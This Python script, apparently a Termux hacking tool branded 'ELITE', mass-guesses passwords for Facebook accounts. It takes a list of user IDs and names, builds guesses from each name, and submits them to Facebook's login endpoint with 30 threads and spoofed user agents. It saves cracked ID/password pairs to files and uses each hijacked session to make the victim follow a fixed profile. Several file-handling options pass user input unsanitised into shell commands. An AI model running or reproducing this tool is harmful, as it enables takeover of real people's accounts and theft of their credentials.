#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib,string
from concurrent.futures import ThreadPoolExecutor as kaam
from datetime import datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from string import *


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen2=[]
ugen=[]

for xd in range(5000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
os.system('clear')
logo=("""                   
███████╗██╗     ██╗████████╗███████╗
██╔════╝██║     ██║╚══██╔══╝██╔════╝
█████╗  ██║     ██║   ██║   █████╗  
██╔══╝  ██║     ██║   ██║   ██╔══╝  
███████╗███████╗██║   ██║   ███████╗
╚══════╝╚══════╝╚═╝   ╚═╝   ╚══════                                    
\033[1;32m        I Am Still In Learning>>                                      
\033[1;31m----------------------------------------------
\033[37m>>>> Owner     : TANVI
\033[37m>>>> Facebook :   TANVI
\033[37m>>>> Vesion    :  1.4
\033[1;31m----------------------------------------------""")
               
def linex():
    print('\033[1;37m----------------------------------------------')


def menu():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print('\033[1;33m~~~~~CMD Menu~~~~~')
    linex()
    print('\033[1;32m[1] File Cloning Menu')
    print('\033[1;32m[2] Remove Double Links')
    print('\033[1;32m[3] Seperate Ids')
    print('\033[1;32m[4] Join Whatsapp Grorup')
    print('\033[1;37m----------------------------------------------')
    print('\033[1;33mJoin Whatsapp Group For Update Informataion')
    linex()
    _sarfraz___ = input(' [+] Choose option : ')
    if _sarfraz___ in ('1', '01'):
        __xxx__().kamix(id)
    elif _sarfraz___ in ('2', '02'):
        double()
    elif _sarfraz___ in ('3', '03'):
        sprate()
    elif _sarfraz___ in ('4', '04'):
        wtjoin()


class __xxx__:
    def __init__(self):
        self.id = []
    def kamix(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('\033[1;36mPut File Path : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [+] Choose Correct One');
            self.kamix(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Cracking] {loop}|{len(self.id)} \33[1;32mOK:-{len(ok)} \33[1;31mCP:-{len(cp)}\33[1;37m ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                ua=random.choice(ugen)
                header = {}
                r = session.get(f"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {'Host': 'p.facebook.com',
                           'method':'GET',
                           'viewport-width': '980',
                           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="341"',
                           'sec-ch-ua-mobile': '?1',
                           'sec-ch-ua-platform':'"Android"',
                           'sec-ch-prefers-color-scheme': 'light',
                           'dnt': '1',
                           'upgrade-insecure-requests': '1',
                           'user-agent': 'Mozilla/5.0 (Linux; Android 5.1; PSP5502DUO Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/341.0.0.7.68;]',
                           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
                           'sec-fetch-site': 'none',
                           'sec-fetch-mode': 'navigate',
                           'sec-fetch-user': '?1', 
                           'sec-fetch-dest': 'document', 
                           'accept-encoding': 'gzip, deflate, br',
                           'accept-language': 'en-US,en;q=0.9'}
                po = session.post(f"https://p.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [ELITE-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('/sdcard/KAMI-OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        # print('\r%s\33[1;33m [2F] %s|%s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('/sdcard/KAMII-CP.txt', 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    # print('\r%s\33[1;36m [2f] %s|%s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('/sdcard/KAMII-2F.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        linex()
        print('\033[1;32m[1] Crack With Auto All Name Pass ')
        print('\033[1;32m[2] Crack With Name Digit Pass')
        print('\033[1;32m[3] Crack With Digits Pass For Old Ids')
        linex()
        chi = input('\033[1;37m [?] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse Jahaz For OK IDS\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Sabar Rakho BS..')
            print(47*"-")
            with kaam(max_workers=30) as kamran:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first=xz[0]
                        last=xz[1]
                        lfirst=first.lower()
                        llast=last.lower()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",first+" "+last,lfirst+" "+llast]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kamran.submit(self._metode_, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            print('\033[1;37m')
            linex()
            print(' The process has completed')
            print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
            linex()
            input(' Press enter to back ')
            menu()        

        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse Jahaz For OK IDS\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Sabar Rakho BS..')
            print(47*"-")
            with kaam(max_workers=30) as kamran:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kamran.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            print('\033[1;37m')
            linex()
            print(' The process has completed')
            print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
            linex()
            input(' Press enter to back ')
            menu()      
        elif chi in ('3', '03'):
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse Jahaz For OK IDS\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total IDs : %s ' % len(self.id))
            print('\033[1;37m Sabar Rakho BS..')
            print(47*"-")
            with kaam(max_workers=30) as kamran:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first=xz[0]
                        last=xz[1]
                        lfirst=first.lower()
                        llast=last.lower()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name,first+" "+last,lfirst+" "+llast,lfirst+llast,lfirst+llast+"123",lfirst+llast+"1234",lfirst+llast+"12345",lfirst+llast+"1122",lfirst+llast+"786",lfirst+"1122",lfirst+"786",lfirst+"123",lfirst+"1234",lfirst+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kamran.submit(self._metode_, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            print('\033[1;37m')
            linex()
            print(' The process has completed')
            print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
            linex()
            input(' Press enter to back ')
            menu()        
        else:
            print('\n Select Valid One')
            self._pler_()  


def sprate():
        os.system('clear');print(logo)
        try:
                limit = int(input('\033[1;36m How many links do you want to separate :\033[1;37m '))
        except:
                limit = 1
        print(f'\033[1;33mFile Path Example /sdcard/filename.txt')
        print('\033[1;37m----------------------------------------------')
        file_name = input('\033[1;32m Input file path : ')
        print('\033[1;37m----------------------------------------------')
        print(f'\033[1;33mSave As Example /sdcard/newfile.txt')
        print('\033[1;37m----------------------------------------------')
        new_save = input('\033[1;32m Save new file as : ')
        print('\033[1;37m----------------------------------------------')
        y = 0
        print(f"\033[1;33m Type Any UID[ 100087,10000,10006 etc ]")
        print('\033[1;37m----------------------------------------------')
        for k in range(limit):
                y+=1
                links=input('\033[1;33m Put Uid Type :\033[1;37m ')
                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
        print('\033[1;37m----------------------------------------------')
        print(f'\033[1;32m ids Extracted successfull')
        print('\033[1;37m----------------------------------------------')
        print('\033[1;32m Total Extract ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
        print('\033[1;37m----------------------------------------------')
        print('\033[1;32m New file saved as : \033[0;33m '+new_save)
        print('\033[1;37m----------------------------------------------')
        input('\033[1;32m Press enter to back ')
        menu()

def double():
        os.system('clear')
        print(logo)
        user_file = input('\033[1;36m PUT File Path :\033[1;37m ')
        print('\033[1;37m----------------------------------------------')
        try:
                open(user_file,'r').read()
                print('\033[1;33m Example: /sdcard/filename.txt')
                print('\033[1;37m----------------------------------------------')
                save_file = input('New File Save As: ')
                os.system('touch '+save_file)
                os.system('sort -r '+user_file+' | uniq > '+save_file)
                print('\033[1;37m----------------------------------------------')
                print('\033[1;32m Dublicate Links Removed From File')
                print('\033[1;32m File Saved As : '+save_file)
                print('\033[1;37m----------------------------------------------')
                input('\033[1;32m Press enter to back ')
                menu()
        except FileNotFoundError:
                print(' Invalid File ')


def wtjoin():
    os.system(f"termux-open-url https://chat.whatsapp.com/JjToPJVRbehC3NMvVzQqik")
    
menu()